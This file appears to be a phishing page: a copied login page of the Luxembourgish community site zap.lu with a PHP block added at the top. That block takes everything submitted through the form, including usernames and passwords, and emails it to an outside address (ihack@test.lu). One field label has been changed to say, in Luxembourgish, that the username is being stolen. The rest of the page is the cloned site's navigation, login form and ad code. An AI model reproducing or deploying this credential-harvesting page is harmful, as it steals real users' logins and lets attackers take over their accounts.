<?php
if ($_POST) {
//  echo '<pre>';
//   echo htmlspecialchars(print_r($_POST, true));
//    echo '</pre>';

// The message
//$message = "Line 1\nLine 2\nLine 3";
$message = print_r($_POST, true);

// In case any of our lines are larger than 70 characters, we should use wordwrap()
$message = wordwrap($message, 70);

// Send
mail('ihack@test.lu', 'Another one bites the dust', $message);
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>

<!-- (C) Patric de Waha - patric@p-dw.com	-->




<!-- <META http-equiv="Page-Enter" content="blendTrans(duration=0.4)">-->
<meta http-equiv="content-type" content="text/html; charset=UTF-8"> 
<meta name="description" content="zap.lu">
<meta name="keyword" content="agenda,singles,kommunikatioun,disco,club,pubs,cafe,bal,baler,fotoen,party,community,chat">
<title> { www.zap.lu ZAP V1 }</title>

<script type="text/javascript" src="loginform_files/main.html" charset="UTF-8">
</script>
<script type="text/javascript" src="loginform_files/psos.html" charset="UTF-8">
</script>


<link rel="STYLESHEET" media="SCREEN" href="loginform_files/regular.css">
<link rel="shortcut icon" href="http://www.zap.lu/faces/zap.lu/p/favicon.ico" type="image/x-icon">

<link href="loginform_files/jquery.css" rel="stylesheet" type="text/css"><script src="loginform_files/autofilljs.html" type="text/javascript"></script><style>input.vpws_ac_red { background-image: url('https://myvidoop.com/images/plugin/v_safe_icon_toolbar_red_16x.gif') !important; background-position: right center !important; background-repeat: no-repeat !important }
input.vpws_current_field  { background-image: url('https://myvidoop.com/images/plugin/v_safe_icon_add.gif') !important; background-position: right center !important; background-repeat: no-repeat !important }
.vpws_added { cursor: pointer; font-family: arial; border: thin solid black; padding-top: 5px; padding: 5px; color: #0376CE; font-size: 14px; font-style: normal; background: white url('https://myvidoop.com/images/common/messagebox_ok.png') left center no-repeat; padding-left: 25px; position: absolute; }
.vpws_new { display: block; padding-top: 5px; min-height: 20px; color: #0376CE; font-size: 90%; font-style: italic; background: url('https://myvidoop.com/images/plugin/v_safe_icon_add.gif') left center no-repeat; padding-left: 25px; }
</style></head><body><div id="pageFader" onclick="deactivateHomepage(); " style="position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; background-color: white; z-index: 111; display: none;">&nbsp;</div>

<div id="browser" style="position: absolute; z-index: 9000; top: 0px; left: 0px; width: 860px; height: 700px; display: none;">



		<div style="position: absolute; z-index: 9000; left: 385px; top: 30px;"><a href="javascript:deactivateHomepage()"><img src="loginform_files/closebrowser.gif" border="0"></a></div>
		<div style="overflow: hidden; height: 60px; width: 425px; z-index: 8000; background-image: url(/skins/zap-blade/p/browserHead.png); background-repeat: no-repeat; background-position: left top; text-align: right;">&nbsp;</div>
		<div id="browserUrl"><a id="browserAnchor" href="" target="_blank"></a></div>

	
		<div class="browserBG" style="z-index: 9000; width: 860px; height: 700px;"><iframe class="browserBG" id="browserFrame" name="browserFrame" style="z-index: 9000; width: 860px; height: 700px;" marginheight="0" marginwidth="0" scrolling="auto" frameborder="0"></iframe></div>

</div>
<div class="default">
<div style="width: 974px; margin-left: auto; margin-right: auto; position: relative;">
	<div style="position: relative; top: 70px; width: 844px; background-image: url(/skins/zap-blade/p/head.png); background-repeat: no-repeat;">
	

				
		
		<div style="position: absolute; top: 36px; right: 5px; z-index: 1001;">
			<div id="ubLoginAndCo">
			<div class="default">
									<a class="ubLoginAndCoLinks" style="" href="http://www.zap.lu/_a/_users/profile.html?profile%5BMode%5D=profile%2Fregister">Member gin</a>
			
						 |  
					<a class="ubLoginAndCoLinks" style="font-weight: bold;" href="http://www.zap.lu/_a/_users/loginform.html">Anloggen</a>						
						
		
				</div>			</div>	
		</div>
	

            <div style="position: absolute; top: 35px; left: 145px; line-height: 18px; height: 18px; z-index: 1000;">
                      <a class="wpFilterChosal" style="margin-right: 20px; line-height: 18px;" href="javascript:void(showLangs())">Letzebuergeg</a>

      </div>


	
				<div style="position: absolute; top: 35px; left: 250px; line-height: 18px; height: 18px; z-index: 1000;">
				<a class="wpFilterChosal" style="margin-right: 20px; line-height: 18px;" href="javascript:void(showRegion())">All Regiounen</a>										
				
		</div>
		<div style="position: absolute; top: 35px; left: 355px; line-height: 18px; height: 18px; z-index: 1000;">		
			<a class="wpFilterChosal" style="line-height: 18px;" href="javascript:void(showAge())">19 bis 40 Joer</a>
		</div>


       <div id="chooseLangs" style="display: none; z-index: 1000;">         
               <div style="padding-left: 4px;">         

                        <a class="wpFilterChosal" style="background-image: none;" href="javascript:switchlang('lu')">Letzebuergeg</a> 
                        <a class="wpFilterChosal" style="background-image: none;" href="javascript:switchlang('de')">Deutsch</a>     
               </div>         
       </div>        


		<div id="chooseRegion" style="display: none; z-index: 1000;">
			<div style="padding-left: 4px;">
	                        
				<a class="wpFilterChosal" style="background-image: none;" href="javascript:switchregion(0)">All Regounen</a>
					
					<a class="wpFilterChosal" style="background-image: none;" href="javascript:switchregion(1)">Zentrum</a>
	            	
					<a class="wpFilterChosal" style="background-image: none;" href="javascript:switchregion(2)">Minett</a>
	            	
					<a class="wpFilterChosal" style="background-image: none;" href="javascript:switchregion(3)">Osten</a>
	            	
					<a class="wpFilterChosal" style="background-image: none;" href="javascript:switchregion(4)">Norden</a>
	            	
					<a class="wpFilterChosal" style="background-image: none;" href="javascript:switchregion(5)">Westen</a>
	            	
			</div>
		</div>
		
		<div id="chooseAge" style="display: none; z-index: 1000;">
		
			<div><span style="color: white; padding-top: 3px; padding-left: 5px;">Filter fir den Alter</span></div>
			<center>		
				<div style="padding-top: 9px;">
					<select id="chooseFrom" name="from" style="font-size: 8px;">
						<option value="17">17</option><option value="18">18</option><option value="19" selected="selected">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option><option value="32">32</option><option value="33">33</option><option value="34">34</option><option value="35">35</option><option value="36">36</option><option value="37">37</option><option value="38">38</option><option value="39">39</option><option value="40">40</option><option value="41">41</option><option value="42">42</option><option value="43">43</option><option value="44">44</option><option value="45">45</option><option value="46">46</option><option value="47">47</option><option value="48">48</option><option value="49">49</option><option value="50">50</option><option value="51">51</option><option value="52">52</option><option value="53">53</option><option value="54">54</option><option value="55">55</option>					</select>
					<span style="color: white;">bis</span>
					<select id="chooseTo" name="to" style="font-size: 8px;">
						<option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option><option value="32">32</option><option value="33">33</option><option value="34">34</option><option value="35">35</option><option value="36">36</option><option value="37">37</option><option value="38">38</option><option value="39">39</option><option value="40" selected="selected">40</option><option value="41">41</option><option value="42">42</option><option value="43">43</option><option value="44">44</option><option value="45">45</option><option value="46">46</option><option value="47">47</option><option value="48">48</option><option value="49">49</option><option value="50">50</option><option value="51">51</option><option value="52">52</option><option value="53">53</option><option value="54">54</option><option value="55">55</option>					</select>			
				</div>
			</center>
			<div style="padding: 4px; text-align: right;"><a class="wpFilterChosal" style="background-image: none;" href="javascript:switchage($F('chooseFrom'),$F('chooseTo'))">Speicheren</a></div>			
		</div>
			
		<div style="position: relative; left: 0px; top: 0px;">
		<div style="padding-top: 52px;">	
			<div id="wpNavigation" style="overflow: hidden; float: left; margin-top: 19px; width: 135px; min-height: 250px;">
			<div id="wpMainNavigation" class="borderbottom" style="padding-top: 1px;">			
											<script language="javascript">
							setLastActiveMainTab('wpNavHome')
						</script>
					
						 						 		
						 		
							<a id="wpNavHome" class="wpMainTabActive" style="" href="javascript:void(mainTabClick('wpNavHome'));">Zap.lu</a>	
							
							<div id="wpNavHomeSD" class="wpSubTabContainer" style="">
									
		<a class="wpSubTabActive" href="http://www.zap.lu/_a/index.html?&amp;tab=1&amp;subtab=1">Iwersiicht</a>
								
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_home/?&amp;tab=1&amp;subtab=2">Deng Homebase</a>
										
		<a class="wpSubTab" href="http://www.zap.lu/_a/_ams/index.html?&amp;tab=1&amp;subtab=3">Deng Norichten</a>
																	
																	
		<a class="wpSubTab" href="http://www.zap.lu/_a/shoutbox.html?&amp;tab=1&amp;subtab=4">Shoutbox</a>
										
		<a class="wpSubTab" href="http://www.zap.lu/_a/_users/profile.html?profile%5BMode%5D=profile%2Fregister&amp;tab=1&amp;subtab=5">Member gin</a>
									
								
							</div>
							
						
						
						 						
						<a id="wpNavNightlife" class="wpMainTabInactive" style="" href="javascript:void(mainTabClick('wpNavNightlife'));">Nuetsliewen </a>	
						
						<div id="wpNavNightlifeSD" class="wpSubTabContainer" style="display: none;">
								
		<a class="wpSubTab" href="http://www.zap.lu/tabs/pictures.html?tab=7&amp;tab=7&amp;subtab=6">Iwersiicht</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_pictures/query.html?mode=4&amp;qdata=&amp;page=1&amp;tab=7&amp;subtab=7">Mescht gekuckten</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_pictures/query.html?mode=1&amp;qdata=&amp;page=1&amp;tab=7&amp;subtab=8">Di beschten</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_pictures/query.html?mode=8&amp;qdata=&amp;page=1&amp;tab=7&amp;subtab=9">Zoufaelleg Fotoen</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_events/?&amp;tab=7&amp;subtab=10">Event siichen</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_about/crew.html?&amp;tab=7&amp;subtab=11">Party Fotografen</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_agenda/?&amp;tab=7&amp;subtab=12">Agenda</a>
								

						</div>

						 						
						<a id="wpNavSingles" class="wpMainTabInactive" style="" href="javascript:void(mainTabClick('wpNavSingles'));">Singles</a>	
						
						
						<div id="wpNavSinglesSD" class="wpSubTabContainer" style="display: none;">
								
		<a class="wpSubTab" href="http://www.zap.lu/tabs/singles.html?&amp;tab=4&amp;subtab=13">Iwersiicht</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_singles/?nav%5Bqry%5D=6&amp;tab=4&amp;subtab=14">Online Singles</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_singles/?nav%5Bqry%5D=7&amp;tab=4&amp;subtab=15">Dei nei Singles</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_singles/?nav%5Bqry%5D=8&amp;tab=4&amp;subtab=16">Mescht gekuckten</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_singles/?nav%5Bqry%5D=9&amp;tab=4&amp;subtab=17">Dei beleiwsten</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_singles/search.html?&amp;tab=4&amp;subtab=18">Siichen</a>
			
						</div>
								

						 
						 	
						<a id="wpNavHomepages" class="wpMainTabInactive" style="" href="javascript:void(mainTabClick('wpNavHomepages'));">Homepagen</a>	
						
						<div id="wpNavHomepagesSD" class="wpSubTabContainer" style="display: none;">
								
		<a class="wpSubTab" href="http://www.zap.lu/tabs/homepages.html?tab=5&amp;tab=5&amp;subtab=19">Iwersiicht</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_homepages/?nav%5Bqry%5D=7&amp;tab=5&amp;subtab=20">Nei HPs</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_homepages/?nav%5Bqry%5D=9&amp;tab=5&amp;subtab=21">Populaerst</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_homepages/?nav%5Bqry%5D=5&amp;tab=5&amp;subtab=22">Fresch upgdate</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_homepages/search.html?&amp;tab=5&amp;subtab=23">Siichen</a>
							</div>
												
							
						 							
						
						<a id="wpNavZapper" class="wpMainTabInactive" href="javascript:void(mainTabClick('wpNavZapper'));">Bewunner</a>	
						
						<div id="wpNavZapperSD" class="wpSubTabContainer" style="display: none;">
								
		<a class="wpSubTab" href="http://www.zap.lu/tabs/users.html?&amp;tab=3&amp;subtab=24">Iwersiicht</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_suspects/?nav%5Bqry%5D=6&amp;tab=3&amp;subtab=25">Online Bewunner</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_suspects/?nav%5Bqry%5D=7&amp;tab=3&amp;subtab=26">Dei nei</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_suspects/?nav%5Bqry%5D=8&amp;tab=3&amp;subtab=27">Mescht gekuckten</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_suspects/?nav%5Bqry%5D=9&amp;tab=3&amp;subtab=28">Dei populaerst</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_suspects/search.html?&amp;tab=3&amp;subtab=29">Siichen</a>
								
					
						</div>
						
						
														
																		
			</div>

					
																
			
			
				
	<!--*********************************************************
		*********************************************************
		********************************************************* -->

	
	
			<div style="padding-top: 10px; padding-left: 6px;">
	
		<div style="height: 16px;">

						        <div style="float: left; padding-left: 10px;"><a href="http://www.zap.lu/_a/shoutbox.html"><img src="loginform_files/shoutbox_anim.gif" onmouseover="this.src='/skins/zap-blade/p/shoutbox.gif'" onmouseout="this.src='/skins/zap-blade/p/shoutbox_anim.gif'"></a></div>
		       
		        <div style="float: left; padding-left: 10px;"><a href="http://www.zap.lu/_a/_users/profile.html?profile%5BMode%5D=profile%2Fregister"><img src="loginform_files/profile_gro.gif" onmouseover="this.src='/skins/zap-blade/p/profile.gif'" onmouseout="this.src='/skins/zap-blade/p/profile_gro.gif'"></a></div>
		        
		        		        
				
		        <div style="float: left; padding-left: 10px;"><a href="http://www.zap.lu/_a/_home/?subtab=2&amp;tab=1"><img id="izapicon" src="loginform_files/izap_gro.gif" onmouseover="this.src='/skins/zap-blade/p/izap.gif'" onmouseout="this.src='/skins/zap-blade/p/izap_gro.gif'"></a></div>
								

				
								
				<div style="float: left; padding-left: 10px;"><a href="http://www.zap.lu/_a/_ams/index.html"><img id="norichtenwait" src="loginform_files/norichten_gro.gif" onmouseover="this.src='/skins/zap-blade/p/norichten.gif'" onmouseout="this.src='/skins/zap-blade/p/norichten_gro.gif'"></a></div>

		        
		        <div style="width: 0pt; height: 0pt; clear: both;"></div>
		</div>
			
	</div>	
		

	
	<!--	*********************************************************
		*********************************************************
		********************************************************* -->
		
						
	

				
		
					<div style="padding-top: 10px;" class="default">
						<div class="wpCorner href=" javascript:void(true)="">227 Visiteuren</div>	
						<a class="wpSubTab" style="margin-bottom: 2px;" href="http://www.zap.lu/_a/_suspects/?nav%5Bqry%5D=6&amp;filter=1">103 Memberen</a>	
						<div class="wpSubTab">124 Anonymer</div>
					</div>
					

							</div>
			</div>
		
			<div id="wpContent" style="overflow: hidden; float: right; width: 709px; position: relative;">
						
				<div style="border-style: solid; border-color: rgb(62, 93, 153) rgb(58, 88, 149) rgb(58, 88, 149) rgb(58, 94, 156); border-width: 1px; min-height: 640px; line-height: 0pt;">
					<div style="position: absolute; top: 0pt; left: 0pt;"><img src="loginform_files/content_head_small.png" border="0"></div>
					<div style="padding: 10px; line-height: normal; text-align: left;" class="default">
					
					
	
<script type="text/javascript" charset="UTF-8">
	function mailPassword()	{
		var uname = document.getElementById('UNAME_LP');
		if (callUrl('/_a/_users/ajax/mailpassword.html?auth[username]='+encodeURIComponent(uname.value)))	{
			notice("Dein Passwuert get dir an puer Minuten zougemailt.");
		}	else	{
			notice("Konnt dir aus teschneschen Grenn dein Passwuert net zoumailen.");		
		}
	}
</script>



	

	<div style="float: left; width: 405px;">
	<div>
<div class="boxRegularCanvas" style="width: 100%;">

	<div class="boxRegularTopTab">
		
		<div class="boxRegularTopTab" style="float: left;">Anloggen</div>
		<div style="clear: both;"></div>
	</div>
		
		
			

	<div class="boxRegularInnerCanvas" style="padding-top: 3px; text-align: left;">
		<div>			
		<form vpws_id="bb7f88fcea5138f0" id="loginform" action="/_a/_users/login.html" method="post">
		<input name="sn" value="aWpq1xTIenZwd0" type="hidden">
	
			<div style="padding: 10px;"><span style="font-size: 12px;">Wanns de schon Member bass, geff w.e.g. dein Benotzernumm / Passwuert an:</span></div>	
			<div style="padding-left: 10px; padding-right: 10px;">
			<table style="width: 100%; margin-top: 10px; margin-bottom: 10px;" cellpadding="5">	
				<tbody><tr><td><span class="t_a">Ech Klauen elo Dein Benotzernumm</span></td>	<td><input class="vpws_ac_input" autocomplete="off" vpws_id="caf0285550b6c7e7" name="auth[username]" maxlength="50" size="20" value="" type="text"><span></span></td></tr>
				<tr><td><span class="t_a">an Dein Passwuert</span></td>		<td><input class="vpws_ac_input" autocomplete="off" vpws_id="c74d3cdfaed86709" name="auth[password]" size="20" maxlength="50" type="password"></td></tr>
				<tr><td><span class="t_a">Ageloggt bleiwen</span></td>	<td><input vpws_id="47f3520698874c6f" name="loggedin" value="y" onclick="(this.checked) ? $('loggedininfo').show() : $('loggedininfo').hide()" type="checkbox"></td></tr>
				<tr><td colspan="2"><div class="" id="loggedininfo" style="padding-top: 10px; display: none;"><div><span style="font-size: 12px; font-weight: bold;">Opgepasst</span></div><div style="padding: 5px; text-align: justify;"><span class="l">Mat
deser Funktion bass de emmer wanns de op den Site kenns, direkt
ageloggt. Des Funktioun sollt just benetzt gin wanns de dir secher bass
dass keen anneren op dein Computer zougreff huet.</span></div></div></td></tr>
				<tr><td colspan="2" align="right"><div style="float: right;"><div><div style="overflow: hidden; width: 100%;"><a class="formbutton" style="float: right;" href="javascript:void($('loginform').submit())">Anloggen</a></div></div></div><div style="clear: both;"></div></td></tr>
			</tbody></table>
			</div>
	
		</form>
		
					</div>
		</div>
	</div>
</div>		<div>
<div class="boxRegularCanvas" style="width: 100%;">

	<div class="boxRegularTopTab">
		
		<div class="boxRegularTopTab" style="float: left;">Passwuert&nbsp;vergiess</div>
		<div style="clear: both;"></div>
	</div>
		
		
			

	<div class="boxRegularInnerCanvas" style="padding-top: 3px; text-align: left;">
		<div>		
			<div style="padding: 10px;"><span style="font-size: 12px;">Wanns de dein Passwuert vergiess hues, gef w.e.g dein Benotzernumm un, fir dir dein Passwuert zemailen</span></div>
			<div style="padding-left: 20px;">		
			<table style="width: 100%; margin-top: 10px; margin-bottom: 10px;" cellpadding="5">	
				<tbody><tr><td><span class="t_a">Dein Benotzernumm</span></td>	<td><input id="UNAME_LP" name="auth[username]" maxlength="14" size="20" value="" type="text"></td></tr>
				<tr><td colspan="2" style="text-align: right;" align="right"><div style="float: right;"><div><div style="overflow: hidden; width: 100%;"><a class="formbutton" style="float: right;" href="javascript:void(mailPassword())">Passwuert Mailen</a></div></div></div><div style="clear: both;"></div></td></tr>
		
			</tbody></table>
			</div>
				</div>
		</div>
	</div>
</div>	</div>
	<div style="float: right; width: 270px;">	
		<div>
<div class="boxRegularCanvas" style="width: 100%;">

	<div class="boxRegularTopTab">
		
		<div class="boxRegularTopTab" style="float: left;">Opgepasst</div>
		<div style="clear: both;"></div>
	</div>
		
		
			

	<div class="boxRegularInnerCanvas" style="padding-top: 3px; text-align: left;">
		<div>		
			<div style="padding: 10px; text-align: justify;">
			<span style="font-size: 12px;">
				<img src="loginform_files/hotzap.gif" border="0">
				<br>
				<div style="padding-top: 10px;">
									<b style="font-weight: bold;">ZAP.lu</b> an <b style="font-weight: bold;">HOT.lu</b> hun fusionneiert. Wanns du also een Account hues um <b style="font-weight: bold;">HOT.lu</b>, kanns de deen Account och benetzen
					fir dech um ZAP anzeloggen.				
								</div>
				<div style="text-align: right;"><a href="http://blog.zap.lu/" target="_blank">mei Informationen</a></div>
			</span>
			</div>
			
					</div>
		</div>
	</div>
</div>	</div>
	<div style="clear: both;"></div>


	
</div>
					<div style="position: absolute; bottom: 0pt; left: 0pt;"><img src="loginform_files/content_foot_small.png" border="0"></div>
				</div>				
				


			</div>
				<div style="width: 709px; float: right;">
				
						<center>
													<span><a href="http://www.zap.lu/_a/_about/about.html">Iwert Zap.lu</a></span>
												
													
							<span>&nbsp;&nbsp;| &nbsp;&nbsp;<a href="http://www.zap.lu/_a/_about/pub.html">Publiciteit op Zap.lu</a></span>
														
																			
							<span>&nbsp;&nbsp;| &nbsp;&nbsp;<a href="http://www.zap.lu/_a/_about/press.html">Downloads</a></span>
												
																				
							<span>&nbsp;&nbsp;| &nbsp;&nbsp;<a href="http://www.zap.lu/_a/_about/support.html">Kontakt &amp; Support</a></span>
																			
																				
							<span>&nbsp;&nbsp;| &nbsp;&nbsp;<a href="http://www.zap.lu/_a/_about/faq.html">FAQ</a></span>
																										
							<span>&nbsp;&nbsp;| &nbsp;&nbsp;<a href="http://www.zap.lu/_a/_about/blog.html">Blog</a></span>
							
						
													<span>&nbsp;&nbsp;| &nbsp;&nbsp;<a href="http://www.zap.lu/faces/zap.lu/about/cim.html?sn=aWpq1xTIenZwd0"><img src="loginform_files/metriweb.gif"></a></span>
							
						</center>
				</div>
			
			
			<div style="clear: both;"></div>
		</div>

	<script type="text/javascript" charset="UTF-8">

        	/* max. length:  123456789012345678901234 */
            var keyword="zaplu";
            var extra="na";

            if (window.metriwebTag)
            	metriwebTag ("zaplu", keyword, extra);
           </script>
		

	</div>	
		<div style="position: absolute; top: 4px; right: 130px;"><div style="width: 728px; height: 90px;"><div style="position: relative; width: 728px; height: 90px;">
					<div id="ad728x90" style="overflow: hidden; width: 728px; height: 90px; visibility: visible; position: absolute; top: 0pt; right: 0pt; z-index: 1000;">
						<div style="position: absolute; top: 0pt; right: 0pt;">
						<script type="text/javascript"><!--//<![CDATA[
						   var m3_u = (location.protocol=='https:'?'https://ads3.zap.lu/www/delivery/ajs.php':'http://ads3.zap.lu/www/delivery/ajs.php');
						   var m3_r = Math.floor(Math.random()*99999999999);
						   if (!document.MAX_used) document.MAX_used = ',';
						   document.write ("<scr"+"ipt type='text/javascript' src='"+m3_u);
						   document.write ("?zoneid=1");
						   document.write ('&amp;cb=' + m3_r);
						   if (document.MAX_used != ',') document.write ("&amp;exclude=" + document.MAX_used);
						   document.write ("&amp;loc=" + escape(window.location));
						   if (document.referrer) document.write ("&amp;referer=" + escape(document.referrer));
						   if (document.context) document.write ("&context=" + escape(document.context));
						   if (document.mmm_fo) document.write ("&amp;mmm_fo=1");
						   document.write ("'><\/scr"+"ipt>");
						//]]>--></script><script type="text/javascript" src="loginform_files/ajs_002.js"></script><div id="ox_78d24456fa30ed7cc5fe92fd86a15b49" style="display: inline;"><embed type="application/x-shockwave-flash" src="loginform_files/banner_zap-hot.swf" style="" id="Advertisement" name="Advertisement" quality="high" wmode="opaque" allowscriptaccess="always" flashvars="clickTARGET=_blank&amp;clickTAG=http%3A%2F%2Fads3.zap.lu%2Fwww%2Fdelivery%2Fck.php%3Foaparams%3D2__bannerid%3D108__zoneid%3D1__cb%3D7686f3fce1" width="728" height="90"></div>
<script type="text/javascript"><!--// <![CDATA[
var ox_swf = new FlashObject('http://ads3.zap.lu/www/images/banner_zap-hot.swf', 'Advertisement', '728', '90', '9');
ox_swf.addVariable('clickTARGET', '_blank');
ox_swf.addVariable('clickTAG', 'http%3A%2F%2Fads3.zap.lu%2Fwww%2Fdelivery%2Fck.php%3Foaparams%3D2__bannerid%3D108__zoneid%3D1__cb%3D7686f3fce1');
ox_swf.addParam('wmode', 'opaque');
ox_swf.addParam('allowScriptAccess','always');
ox_swf.write('ox_78d24456fa30ed7cc5fe92fd86a15b49');
// ]]> --></script><div id="beacon_108" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="loginform_files/lg_002.gif" alt="" style="width: 0px; height: 0px;" width="0" height="0"></div>

						</div>
					</div>
			</div></div></div>
			
		<div style="position: absolute; top: 4px; right: 0px;">
			<div style="width: 120px; height: 600px;"><div style="position: relative; width: 120px; height: 600px;">
					<div id="ad120x600" style="overflow: hidden; width: 120px; height: 600px; visibility: visible; position: absolute; top: 0pt; right: 0pt; z-index: 1000;">
						<div style="position: absolute; top: 0pt; right: 0pt;">
						<script type="text/javascript"><!--//<![CDATA[
						   var m3_u = (location.protocol=='https:'?'https://ads3.zap.lu/www/delivery/ajs.php':'http://ads3.zap.lu/www/delivery/ajs.php');
						   var m3_r = Math.floor(Math.random()*99999999999);
						   if (!document.MAX_used) document.MAX_used = ',';
						   document.write ("<scr"+"ipt type='text/javascript' src='"+m3_u);
						   document.write ("?zoneid=6");
						   document.write ('&amp;cb=' + m3_r);
						   if (document.MAX_used != ',') document.write ("&amp;exclude=" + document.MAX_used);
						   document.write ("&amp;loc=" + escape(window.location));
						   if (document.referrer) document.write ("&amp;referer=" + escape(document.referrer));
						   if (document.context) document.write ("&context=" + escape(document.context));
						   if (document.mmm_fo) document.write ("&amp;mmm_fo=1");
						   document.write ("'><\/scr"+"ipt>");
						//]]>--></script><script type="text/javascript" src="loginform_files/ajs.js"></script><div id="ox_4cb1d95a19ea2d703125bfb8b8547405" style="display: inline;"><embed type="application/x-shockwave-flash" src="loginform_files/skycraper.swf" style="" id="Advertisement" name="Advertisement" quality="high" wmode="opaque" allowscriptaccess="always" flashvars="clickTARGET=_blank&amp;clickTAG=http%3A%2F%2Fads3.zap.lu%2Fwww%2Fdelivery%2Fck.php%3Foaparams%3D2__bannerid%3D28__zoneid%3D6__cb%3Dee94901ae4" width="120" height="600"></div>
<script type="text/javascript"><!--// <![CDATA[
var ox_swf = new FlashObject('http://ads3.zap.lu/www/images/skycraper.swf', 'Advertisement', '120', '600', '6');
ox_swf.addVariable('clickTARGET', '_blank');
ox_swf.addVariable('clickTAG', 'http%3A%2F%2Fads3.zap.lu%2Fwww%2Fdelivery%2Fck.php%3Foaparams%3D2__bannerid%3D28__zoneid%3D6__cb%3Dee94901ae4');
ox_swf.addParam('wmode', 'opaque');
ox_swf.addParam('allowScriptAccess','always');
ox_swf.write('ox_4cb1d95a19ea2d703125bfb8b8547405');
// ]]> --></script><div id="beacon_28" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="loginform_files/lg.gif" alt="" style="width: 0px; height: 0px;" width="0" height="0"></div>

						</div>
					</div>
			</div></div>		</div>
	
</div>
</div>			<script src="loginform_files/urchin.js" type="text/javascript"></script>
			<script type="text/javascript">
				_uacct = "UA-427062-6";
				urchinTracker();
			</script></body></html>
